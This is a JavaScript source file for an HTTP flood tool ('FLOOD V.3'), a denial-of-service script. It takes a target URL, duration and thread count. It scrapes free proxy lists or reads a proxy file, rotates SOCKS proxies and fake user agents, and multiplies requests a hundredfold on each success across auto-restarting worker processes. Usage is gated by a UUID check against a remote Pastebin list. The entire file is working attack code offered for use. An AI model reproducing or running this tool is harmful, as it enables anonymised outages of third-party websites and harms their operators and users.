require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request'),
      axios = require("axios"),
      fs = require('fs'),
	  fakeUa = require('fake-useragent'),
      cluster = require('cluster');    
async function main_process() {
    if (process.argv.length !== 6) {
        console.log(`
        Usage: ./flood [url] [time] [proxyfile/off/auto] [thread]
        Usage: ./flood http://example.com 60 proxy.txt 5
                            FLOOD V.3 By: Wachira Choomsiri`);
        process.exit(0);
    }else{
        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[5];
        Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
            }
            return this;
        }
        if (process.argv[4] == 'off') {
            console.log("RAW MODE")
        } else if (process.argv[4] == 'auto'){
            console.log("AUTO PROXY MODE")
            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all');
			const proxyscrape_https = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all');
            const proxyscrape_socks4 = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all');
            const proxyscrape_socks5 = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all');
            var proxies_socks4 = proxyscrape_socks4.data.replace(/\r/g, '').split('\n');
            var proxies_socks5 = proxyscrape_socks5.data.replace(/\r/g, '').split('\n');
            var proxies_http = proxyscrape_http.data.replace(/\r/g, '').split('\n');
			var proxies_https = proxyscrape_https.data.replace(/\r/g, '').split('\n');
            var proxies = [...new Set([...proxies_http, ...proxies_socks4, ...proxies_socks5, ...proxies_https])];
        } else {
            console.log("PROXY MODE")
            var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
        }
        function run() {
            if (process.argv[4] !== 'off') {
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({'proxy': 'socks://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
                        'Cache-Control': 'no-cache',
                        'User-Agent': fakeUa()
                    }
                };
                proxiedRequest(config, function (error, response) {
                    console.log(response.statusCode,response.statusMessage,"alive_proxy:",proxies.length);
                    if (proxies.length == 0) {
                        console.log("auto reset proxy")
                        process.exit(0);
                    }
                    if (response.statusCode >= 200 && response.statusCode <= 226) {
                        for (let index = 0; index < 100; index++) {
                            proxiedRequest(config);
                        }
                    }else{
                        proxies = proxies.remove_by_value(proxy)
                    }
                });
            } else {
                var config = {
                    method: 'get',
                    url: target,
                    headers: { 
                        'Cache-Control': 'no-cache',
                        'User-Agent': fakeUa()
                    }
                };
                request(config, function (error, response) {
                    console.log(response.statusCode,response.statusMessage);
                });
            }
        }
        function thread(){
            setInterval(() => {
                run();
            });	
        }
        async function main(){
                if (cluster.isMaster) {
                    require("machine-uuid")(async function(uuid) {
                        var config = {
                            method: 'get',
                            url: 'https://pastebin.com/raw/Dq5ZfFKc'
                        };
                        request(config, function (error, response) {
                        var checked_uuid = JSON.parse(response.body);
                        if (!checked_uuid.includes(uuid)) {
                            console.log("UUID:",uuid,"login!!")
                            for (let i = 0; i < threads; i++) {
                                cluster.fork();
                                console.log(`Threads: ${i+1} started`);
                            }
                        } else {
                            console.log("UUID:",uuid)
                            process.exit(0);
                        }
                        });
                    })
                    cluster.on('exit', function(){
                        cluster.fork();
                    });
                } else {
                    thread();
                }
        }
        main();
        setTimeout(() => {console.log('Attack ended.');process.exit(0)}, times * 1000);
    }    
}
process.on('uncaughtException', function (err) {});
process.on('unhandledRejection', function (err) {});
main_process();    
